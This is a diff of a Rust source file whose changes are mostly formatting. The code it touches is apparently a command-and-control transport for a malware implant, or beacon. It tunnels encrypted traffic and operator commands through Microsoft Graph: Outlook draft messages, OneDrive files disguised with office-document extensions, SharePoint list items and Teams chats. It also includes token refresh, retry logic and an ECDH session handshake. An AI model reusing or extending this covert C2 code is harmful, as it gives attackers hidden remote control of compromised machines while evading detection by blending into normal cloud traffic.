@@ -64,8 +64,8 @@
 use anyhow::{anyhow, bail, Context, Result};
 use async_trait::async_trait;
 use base64::Engine;
-use common::{CryptoSession, Message, Transport};
 use common::lock::MutexExt;
+use common::{CryptoSession, Message, Transport};
 use rand::Rng;
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
@@ -94,11 +94,11 @@ const MAX_ITEMS_PER_QUERY: usize = 50;
 
 /// Legitimate-looking file extensions for OneDrive channel.
 const FILE_EXTENSIONS: &[&str] = &[
-    "xlsx",  // Excel spreadsheet
-    "docx",  // Word document
-    "pdf",   // PDF document
-    "pptx",  // PowerPoint presentation
-    "xlsx",  // Weight Excel higher
+    "xlsx", // Excel spreadsheet
+    "docx", // Word document
+    "pdf",  // PDF document
+    "pptx", // PowerPoint presentation
+    "xlsx", // Weight Excel higher
 ];
 
 /// Rate-limit backoff: seconds to wait on HTTP 429 (Too Many Requests).
@@ -475,7 +475,9 @@ impl GraphClient {
                 // observes a mix of old access_token + new token_expiry.
                 self.tokens = TokenPair {
                     access_token: token_resp.access_token,
-                    refresh_token: token_resp.refresh_token.or_else(|| self.tokens.refresh_token.clone()),
+                    refresh_token: token_resp
+                        .refresh_token
+                        .or_else(|| self.tokens.refresh_token.clone()),
                     token_expiry: Instant::now() + Duration::from_secs(token_resp.expires_in),
                 };
                 tracing::debug!("graph c2: token refreshed successfully");
@@ -498,19 +500,21 @@ impl GraphClient {
         let url = format!("{}{}", self.graph_base_url(), path);
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self.retry_on_server_error(|| {
-            let url = url.clone();
-            let token = token.clone();
-            async move {
-                client
-                    .get(&url)
-                    .header("Authorization", format!("Bearer {}", token))
-                    .header("Content-Type", "application/json")
-                    .send()
-                    .await
-                    .context("Graph API GET error")
-            }
-        }).await?;
+        let resp = self
+            .retry_on_server_error(|| {
+                let url = url.clone();
+                let token = token.clone();
+                async move {
+                    client
+                        .get(&url)
+                        .header("Authorization", format!("Bearer {}", token))
+                        .header("Content-Type", "application/json")
+                        .send()
+                        .await
+                        .context("Graph API GET error")
+                }
+            })
+            .await?;
         self.handle_rate_limit(resp).await
     }
 
@@ -518,31 +522,29 @@ impl GraphClient {
     ///
     /// The body is serialized to JSON bytes before the retry loop so that
     /// it can be replayed on transient 5xx errors (MED-002).
-    async fn post(
-        &mut self,
-        path: &str,
-        body: impl Serialize,
-    ) -> Result<reqwest::Response> {
+    async fn post(&mut self, path: &str, body: impl Serialize) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let json_bytes = serde_json::to_vec(&body).context("Graph API POST serialize error")?;
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self.retry_on_server_error(|| {
-            let url = url.clone();
-            let token = token.clone();
-            let json_bytes = json_bytes.clone();
-            async move {
-                client
-                    .post(&url)
-                    .header("Authorization", format!("Bearer {}", token))
-                    .header("Content-Type", "application/json")
-                    .body(json_bytes)
-                    .send()
-                    .await
-                    .context("Graph API POST error")
-            }
-        }).await?;
+        let resp = self
+            .retry_on_server_error(|| {
+                let url = url.clone();
+                let token = token.clone();
+                let json_bytes = json_bytes.clone();
+                async move {
+                    client
+                        .post(&url)
+                        .header("Authorization", format!("Bearer {}", token))
+                        .header("Content-Type", "application/json")
+                        .body(json_bytes)
+                        .send()
+                        .await
+                        .context("Graph API POST error")
+                }
+            })
+            .await?;
         self.handle_rate_limit(resp).await
     }
 
@@ -555,21 +557,23 @@ impl GraphClient {
         let url = format!("{}{}", self.graph_base_url(), path);
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self.retry_on_server_error(|| {
-            let url = url.clone();
-            let token = token.clone();
-            let data = data.clone();
-            async move {
-                client
-                    .put(&url)
-                    .header("Authorization", format!("Bearer {}", token))
-                    .header("Content-Type", "application/octet-stream")
-                    .body(data)
-                    .send()
-                    .await
-                    .context("Graph API PUT error")
-            }
-        }).await?;
+        let resp = self
+            .retry_on_server_error(|| {
+                let url = url.clone();
+                let token = token.clone();
+                let data = data.clone();
+                async move {
+                    client
+                        .put(&url)
+                        .header("Authorization", format!("Bearer {}", token))
+                        .header("Content-Type", "application/octet-stream")
+                        .body(data)
+                        .send()
+                        .await
+                        .context("Graph API PUT error")
+                }
+            })
+            .await?;
         self.handle_rate_limit(resp).await
     }
 
@@ -577,31 +581,29 @@ impl GraphClient {
     ///
     /// The body is serialized to JSON bytes before the retry loop so that
     /// it can be replayed on transient 5xx errors (MED-002).
-    async fn patch(
-        &mut self,
-        path: &str,
-        body: impl Serialize,
-    ) -> Result<reqwest::Response> {
+    async fn patch(&mut self, path: &str, body: impl Serialize) -> Result<reqwest::Response> {
         self.refresh_access_token().await?;
         let url = format!("{}{}", self.graph_base_url(), path);
         let json_bytes = serde_json::to_vec(&body).context("Graph API PATCH serialize error")?;
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self.retry_on_server_error(|| {
-            let url = url.clone();
-            let token = token.clone();
-            let json_bytes = json_bytes.clone();
-            async move {
-                client
-                    .patch(&url)
-                    .header("Authorization", format!("Bearer {}", token))
-                    .header("Content-Type", "application/json")
-                    .body(json_bytes)
-                    .send()
-                    .await
-                    .context("Graph API PATCH error")
-            }
-        }).await?;
+        let resp = self
+            .retry_on_server_error(|| {
+                let url = url.clone();
+                let token = token.clone();
+                let json_bytes = json_bytes.clone();
+                async move {
+                    client
+                        .patch(&url)
+                        .header("Authorization", format!("Bearer {}", token))
+                        .header("Content-Type", "application/json")
+                        .body(json_bytes)
+                        .send()
+                        .await
+                        .context("Graph API PATCH error")
+                }
+            })
+            .await?;
         self.handle_rate_limit(resp).await
     }
 
@@ -613,18 +615,20 @@ impl GraphClient {
         let url = format!("{}{}", self.graph_base_url(), path);
         let token = self.tokens.access_token.clone();
         let client = &self.http_client;
-        let resp = self.retry_on_server_error(|| {
-            let url = url.clone();
-            let token = token.clone();
-            async move {
-                client
-                    .delete(&url)
-                    .header("Authorization", format!("Bearer {}", token))
-                    .send()
-                    .await
-                    .context("Graph API DELETE error")
-            }
-        }).await?;
+        let resp = self
+            .retry_on_server_error(|| {
+                let url = url.clone();
+                let token = token.clone();
+                async move {
+                    client
+                        .delete(&url)
+                        .header("Authorization", format!("Bearer {}", token))
+                        .send()
+                        .await
+                        .context("Graph API DELETE error")
+                }
+            })
+            .await?;
         self.handle_rate_limit(resp).await
     }
 
@@ -1093,7 +1097,10 @@ impl GraphChannel for OutlookChannel {
             bail!("failed to create Outlook draft: HTTP {} — {}", status, body);
         }
 
-        tracing::debug!("graph c2 (outlook): created draft with subject '{}'", subject);
+        tracing::debug!(
+            "graph c2 (outlook): created draft with subject '{}'",
+            subject
+        );
         Ok(())
     }
 
@@ -1102,7 +1109,10 @@ impl GraphChannel for OutlookChannel {
         client: &RwLock<GraphClient>,
         beacon_id: &str,
     ) -> Result<Vec<Vec<u8>>> {
-        let filter = format!("startswith(subject,'{} - {}')", OUTLOOK_SUBJECT_PREFIX, beacon_id);
+        let filter = format!(
+            "startswith(subject,'{} - {}')",
+            OUTLOOK_SUBJECT_PREFIX, beacon_id
+        );
         let path = format!(
             "/me/mailFolders/drafts/messages?$filter={}&$top={}",
             urlencoding::encode(&filter),
@@ -1127,7 +1137,11 @@ impl GraphChannel for OutlookChannel {
                     match decode_email_body(content) {
                         Ok(data) => results.push(data),
                         Err(e) => {
-                            tracing::warn!("graph c2 (outlook): failed to decode draft {}: {}", id, e);
+                            tracing::warn!(
+                                "graph c2 (outlook): failed to decode draft {}: {}",
+                                id,
+                                e
+                            );
                         }
                     }
 
@@ -1170,10 +1184,7 @@ impl OneDriveChannel {
 
     /// Ensure the C2 data folder exists in OneDrive.
     async fn ensure_folder(&self, client: &RwLock<GraphClient>) -> Result<()> {
-        let path = format!(
-            "/me/drive/root:/{}",
-            urlencoding::encode(&self.folder_name)
-        );
+        let path = format!("/me/drive/root:/{}", urlencoding::encode(&self.folder_name));
 
         let mut guard = client.write().await;
         let resp = guard.get(&path).await?;
@@ -1201,7 +1212,11 @@ impl OneDriveChannel {
             if status.as_u16() == 409 {
                 return Ok(());
             }
-            bail!("failed to create OneDrive folder: HTTP {} — {}", status, body);
+            bail!(
+                "failed to create OneDrive folder: HTTP {} — {}",
+                status,
+                body
+            );
         }
 
         tracing::debug!("graph c2 (onedrive): created folder '{}'", self.folder_name);
@@ -1320,7 +1335,10 @@ impl GraphChannel for OneDriveChannel {
             }
         }
 
-        tracing::debug!("graph c2 (onedrive): received {} command files", results.len());
+        tracing::debug!(
+            "graph c2 (onedrive): received {} command files",
+            results.len()
+        );
         Ok(results)
     }
 }
@@ -1483,7 +1501,9 @@ impl SharePointChannel {
                 },
                 SpColumn {
                     name: "status".to_string(),
-                    text_type: SpColumnText { max_length: Some(50) },
+                    text_type: SpColumnText {
+                        max_length: Some(50),
+                    },
                 },
             ],
         };
@@ -1495,7 +1515,11 @@ impl SharePointChannel {
         if !resp.status().is_success() {
             let status = resp.status();
             let body = resp.text().await.unwrap_or_default();
-            bail!("failed to create SharePoint list: HTTP {} — {}", status, body);
+            bail!(
+                "failed to create SharePoint list: HTTP {} — {}",
+                status,
+                body
+            );
         }
 
         let list: SharePointList = resp.json().await?;
@@ -1504,7 +1528,11 @@ impl SharePointChannel {
             .ok_or_else(|| anyhow!("SharePoint list creation response missing id"))?;
 
         self.list_id = Some(list_id.clone());
-        tracing::debug!("graph c2 (sharepoint): created list '{}' ({})", list_name, list_id);
+        tracing::debug!(
+            "graph c2 (sharepoint): created list '{}' ({})",
+            list_name,
+            list_id
+        );
         Ok(list_id)
     }
 }
@@ -1538,10 +1566,17 @@ impl GraphChannel for SharePointChannel {
         if !resp.status().is_success() {
             let status = resp.status();
             let body = resp.text().await.unwrap_or_default();
-            bail!("failed to create SharePoint item: HTTP {} — {}", status, body);
+            bail!(
+                "failed to create SharePoint item: HTTP {} — {}",
+                status,
+                body
+            );
         }
 
-        tracing::debug!("graph c2 (sharepoint): created item for beacon '{}'", beacon_id);
+        tracing::debug!(
+            "graph c2 (sharepoint): created item for beacon '{}'",
+            beacon_id
+        );
         Ok(())
     }
 
@@ -1570,7 +1605,11 @@ impl GraphChannel for SharePointChannel {
         if !resp.status().is_success() {
             let status = resp.status();
             let body = resp.text().await.unwrap_or_default();
-            bail!("failed to query SharePoint items: HTTP {} — {}", status, body);
+            bail!(
+                "failed to query SharePoint items: HTTP {} — {}",
+                status,
+                body
+            );
         }
 
         let items: GraphListResponse<SharePointListItem> = resp.json().await?;
@@ -1662,11 +1701,7 @@ pub struct GraphTransport {
 
 impl GraphTransport {
     /// Create a new Graph API C2 transport.
-    pub fn new(
-        config: GraphC2Config,
-        session: CryptoSession,
-        agent_id: String,
-    ) -> Result<Self> {
+    pub fn new(config: GraphC2Config, session: CryptoSession, agent_id: String) -> Result<Self> {
         if !config.enabled {
             bail!("graph c2 transport is not enabled in config");
         }
@@ -1692,10 +1727,9 @@ impl GraphTransport {
                 Box::new(TeamsChannel::new(chat_id))
             }
             "sharepoint" => {
-                let site_id = config
-                    .sharepoint_site_id
-                    .as_deref()
-                    .ok_or_else(|| anyhow!("sharepoint_site_id is required for SharePoint channel"))?;
+                let site_id = config.sharepoint_site_id.as_deref().ok_or_else(|| {
+                    anyhow!("sharepoint_site_id is required for SharePoint channel")
+                })?;
                 Box::new(SharePointChannel::new(
                     site_id,
                     config.sharepoint_list_id.as_deref(),
@@ -1820,7 +1854,9 @@ impl Transport for GraphTransport {
                             self.ecdh_client = None;
                         }
                         Err(e) => {
-                            tracing::warn!("graph c2: ECDH handshake failed: {e}; keeping PSK-derived session");
+                            tracing::warn!(
+                                "graph c2: ECDH handshake failed: {e}; keeping PSK-derived session"
+                            );
                         }
                     }
                     remaining
@@ -1832,12 +1868,16 @@ impl Transport for GraphTransport {
             };
 
             match self.session.decrypt(ciphertext) {
-                Ok(plaintext) => match bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v) {
-                    Ok(msg) => return Ok(msg),
-                    Err(e) => {
-                        tracing::warn!("graph c2: failed to deserialize message: {}", e);
+                Ok(plaintext) => {
+                    match bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy())
+                        .map(|(v, _)| v)
+                    {
+                        Ok(msg) => return Ok(msg),
+                        Err(e) => {
+                            tracing::warn!("graph c2: failed to deserialize message: {}", e);
+                        }
                     }
-                },
+                }
                 Err(e) => {
                     tracing::warn!("graph c2: failed to decrypt chunk: {}", e);
                 }
